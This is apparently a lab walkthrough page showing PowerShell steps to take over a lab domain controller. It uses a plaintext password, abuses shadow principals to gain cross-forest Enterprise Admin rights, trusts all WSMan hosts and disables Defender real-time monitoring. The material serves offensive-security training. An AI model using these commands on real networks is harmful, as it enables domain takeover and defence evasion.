---
layout: default
---

## acc-dc07.gcbacc.local 192.168.79.1


The full access to this machine is performed for attacker it-employee15 machine

### 1. Impersonate user syslog agent from powershell

```
PS C:\Users\itemployee15> $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force
PS C:\Users\itemployee15> $credential = New-Object System.Management.Automation.PSCredential ('sec\syslogagent', $password)

```

### 2. create session and access to sec-syslog01
```
PS C:\Users\itemployee15> $secdc = New-PSSession -ComputerName 192.168.144.197 -Credential $credential
PS C:\Users\itemployee15> $secdc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.144.197 RemoteMachine   Opened        Microsoft.PowerShell     Available
```

```
PS C:\Users\itemployee15> Enter-PSSession -Session $secdc
[192.168.144.197]: PS C:\Users\syslogagent\Documents> whoami
sec\syslogagent
```

### 3. Create session with EA privileges on sec-dc

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force
[192.168.144.197]: PS C:\Users\syslogagent\Documents> $credential = New-Object System.Management.Automation.PSCredential ('sec\syslogagent', $password)
[192.168.144.197]: PS C:\Users\syslogagent\Documents> $secdc = New-PSSession -ComputerName sec-dc -Credential $credential
``` 

### 4. Enumerate and abuse shadow principals between gcbsec.local and gcbacc.local 

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $secdc


Name                    : Shadow Principal Configuration
member                  : {}
msDS-ShadowPrincipalSid :

Name                    : accforest-ShadowEnterpriseAdmin
member                  : {}
msDS-ShadowPrincipalSid : S-1-5-21-3331877400-209796306-1317730910-519
```
Set syslogagent as accforest-ShadowENterprise admin
```
 Invoke-Command -ScriptBlock {Set-ADObject -Identity "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local" -Add @{'member'="CN=syslogagent,CN=Users,DC=gcbsec,DC=local"} -Verbose} -Session $secdc
VERBOSE: Performing the operation "Set" on target "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local".
```

Set Administrator as accforest-ShadowEnterprise Admin
```
Invoke-Command -ScriptBlock {Set-ADObject -Identity "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=gcbsec,DC=local"} -Verbose} -Session $secdc
VERBOSE: Performing the operation "Set" on target "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local".
```

validate members:
```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $secdc


Name                    : Shadow Principal Configuration
member                  : {}
msDS-ShadowPrincipalSid :

Name                    : accforest-ShadowEnterpriseAdmin
member                  : {CN=syslogagent,CN=Users,DC=gcbsec,DC=local, CN=Administrator,CN=Users,DC=gcbsec,DC=local}
msDS-ShadowPrincipalSid : S-1-5-21-3331877400-209796306-1317730910-519


```


### 5. Enter session on gcbacc.local

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {set-item WSMan:\localhost\Client\TrustedHosts -Value * -Force} -Session $secdc
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock { $accdc = New-PSSession -ComputerName 192.168.79.1 -Credential gcbsec.local\syslogagent} -Session $secdc
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{whoami;hostname} -Session $accdc} -Session $secdc
sec\syslogagent
acc-dc07
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{whoami;hostname;ipconfig} -Session $accdc} -Session $secdc
sec\syslogagent
acc-dc07

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::aa48:e8b7:2ad4:69b%9
   IPv4 Address. . . . . . . . . . . : 192.168.79.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.79.254
```

### 6. Disable AV dump Lsass Domain

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealTimeMonitoring $True; Get-MpPreference} -Session $accdc} -Session $secdc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    PSComputerName                                        : sec-dc                                                                                                                            RunspaceId                                            : 897c70af-2d3a-4827-a54c-109d632e0159                                                                                              AllowDatagramProcessingOnWinServer                    : False                                                                                                                             AllowNetworkProtectionDownLevel                       : False                                                                                                                             AllowNetworkProtectionOnWinServer                     : False                                                                                                                             AllowSwitchToAsyncInspection                          : False                                                                                                                             ApplyDisableNetworkScanningToIOAV                     : False                                                                                                                             AttackSurfaceReductionOnlyExclusions                  :                                                                                                                                   AttackSurfaceReductionRules_Actions                   :                                                                                                                                   AttackSurfaceReductionRules_Ids                       :                                                                                                                                   AttackSurfaceReductionRules_RuleSpecificExclusions    :                                                                                                                                   AttackSurfaceReductionRules_RuleSpecificExclusions_Id :                                                                                                                                   CheckForSignaturesBeforeRunningScan                   : False                                                                                                                             CloudBlockLevel                                       : 0                                                                                                                                 CloudExtendedTimeout                                  : 0                                                                                                                                 ComputerID                                            : 6BEB27A9-17D2-457C-A169-C243E229DB03                                                                                              ControlledFolderAccessAllowedApplications             :                                                                                                                                   ControlledFolderAccessProtectedFolders                :                                                                                                                                   DefinitionUpdatesChannel                              : 0                                                                                                                                 DisableArchiveScanning                                : False                                                                                                                             DisableAutoExclusions                                 : False                                                                                                                             DisableBehaviorMonitoring                             : False                                                                                                                             DisableBlockAtFirstSeen                               : False                                                                                                                             DisableCacheMaintenance                               : False                                                                                                                             DisableCatchupFullScan                                : True                                                                                                                              DisableCatchupQuickScan                               : True                                                                                                                              DisableCpuThrottleOnIdleScans                         : True                                                                                                                              DisableDatagramProcessing                             : False                                                                                                                             DisableDnsOverTcpParsing                              : False                                                                                                                             DisableDnsParsing                                     : False                                                                                                                             DisableEmailScanning                                  : True                                                                                                                              DisableFtpParsing                                     : False                                                                                                                             DisableGradualRelease                                 : False                                                                                                                             DisableHttpParsing                                    : False                                                                                                                             DisableInboundConnectionFiltering                     : False                                                                                                                             DisableIOAVProtection                                 : False                                                                                                                             DisableNetworkProtectionPerfTelemetry                 : False                                                                                                                             DisablePrivacyMode                                    : False                                                                                                                             DisableQuicParsing                                    : False                                                                                                                             DisableRdpParsing                                     : False                                                                                                                             DisableRealtimeMonitoring                             : True                                                                                                                              DisableRemovableDriveScanning                         : True                                                                                                                              DisableRestorePoint                                   : True                                                                                                                              DisableScanningMappedNetworkDrivesForFullScan         : True                                                                                                                              DisableScanningNetworkFiles                           : False                                                                                                                             DisableScriptScanning                                 : False                                                                                                                             DisableSmtpParsing                                    : False                                                                                                                             DisableSshParsing                                     : False                                                                                                                             DisableTlsParsing                                     : False                                                                                                                             EnableControlledFolderAccess                          : 0                                                                                                                                 EnableConvertWarnToBlock                              : False                                                                                                                             EnableDnsSinkhole                                     : True                                                                                                                              EnableFileHashComputation                             : False                                                                                                                             EnableFullScanOnBatteryPower                          : False                                                                                                                             EnableLowCpuPriority                                  : False                                                                                                                             EnableNetworkProtection                               : 0                                                                                                                                 EngineUpdatesChannel                                  : 0                                                                                                                                 ExclusionExtension                                    :                                                                                                                                   ExclusionIpAddress                                    :                                                                                                                                   ExclusionPath                                         :                                                                                                                                   ExclusionProcess                                      :                                                                                                                                   ForceUseProxyOnly                                     : False                                                                                                                             HideExclusionsFromLocalUsers                          : True                                                                                                                              HighThreatDefaultAction                               : 0                                                                                                                                 IntelTDTEnabled                                       :                                                                                                                                   LowThreatDefaultAction                                : 0                                                                                                                                 MAPSReporting                                         : 2                                                                                                                                 MeteredConnectionUpdates                              : False                                                                                                                             ModerateThreatDefaultAction                           : 0                                                                                                                                 NetworkProtectionReputationMode                       : 0                                                                                                                                 OobeEnableRtpAndSigUpdate                             : False                                                                                                                             PerformanceModeStatus                                 : 1                                                                                                                                 PlatformUpdatesChannel                                : 0                                                                                                                                 ProxyBypass                                           :                                                                                                                                   ProxyPacUrl                                           :                                                                                                                                   ProxyServer                                           :                                                                                                                                   PUAProtection                                         : 0                                                                                                                                 QuarantinePurgeItemsAfterDelay                        : 90                                                                                                                                QuickScanIncludeExclusions                            : 0                                                                                                                                 RandomizeScheduleTaskTimes                            : True                                                                                                                              RealTimeScanDirection                                 : 0                                                                                                                                 RemediationScheduleDay                                : 0                                                                                                                                 RemediationScheduleTime                               : 02:00:00                                                                                                                          ReportDynamicSignatureDroppedEvent                    : False                                                                                                                             ReportingAdditionalActionTimeOut                      : 10080                                                                                                                             ReportingCriticalFailureTimeOut                       : 10080                                                                                                                             ReportingNonCriticalTimeOut                           : 1440                                                                                                                              ScanAvgCPULoadFactor                                  : 50                                                                                                                                ScanOnlyIfIdleEnabled                                 : True                                                                                                                              ScanParameters                                        : 1                                                                                                                                 ScanPurgeItemsAfterDelay                              : 15                                                                                                                                ScanScheduleDay                                       : 0                                                                                                                                 ScanScheduleOffset                                    : 120                                                                                                                               ScanScheduleQuickScanTime                             : 00:00:00                                                                                                                          ScanScheduleTime                                      : 02:00:00                                                                                                                          SchedulerRandomizationTime                            : 4                                                                                                                                 ServiceHealthReportInterval                           : 60                                                                                                                                SevereThreatDefaultAction                             : 0                                                                                                                                 SharedSignaturesPath                                  :                                                                                                                                   SharedSignaturesPathUpdateAtScheduledTimeOnly         : False                                                                                                                             SignatureAuGracePeriod                                : 0                                                                                                                                 SignatureBlobFileSharesSources                        :                                                                                                                                   SignatureBlobUpdateInterval                           : 60                                                                                                                                SignatureDefinitionUpdateFileSharesSources            :                                                                                                                                   SignatureDisableUpdateOnStartupWithoutEngine          : False                                                                                                                             SignatureFallbackOrder                                : MicrosoftUpdateServer|MMPC                                                                                                        SignatureFirstAuGracePeriod                           : 120                                                                                                                               SignatureScheduleDay                                  : 8                                                                                                                                 SignatureScheduleTime                                 : 01:45:00                                                                                                                          SignatureUpdateCatchupInterval                        : 1                                                                                                                                 SignatureUpdateInterval                               : 0                                                                                                                                 SubmitSamplesConsent                                  : 1                                                                                                                                 ThreatIDDefaultAction_Actions                         :                                                                                                                                   ThreatIDDefaultAction_Ids                             :                                                                                                                                   ThrottleForScheduledScanOnly                          : True                                                                                                                              TrustLabelProtectionStatus                            : 0                                                                                                                                 UILockdown                                            : False                                                                                                                             UnknownThreatDefaultAction                            : 0                                                                                                                                                                                                   
```
[back](./section6.html)
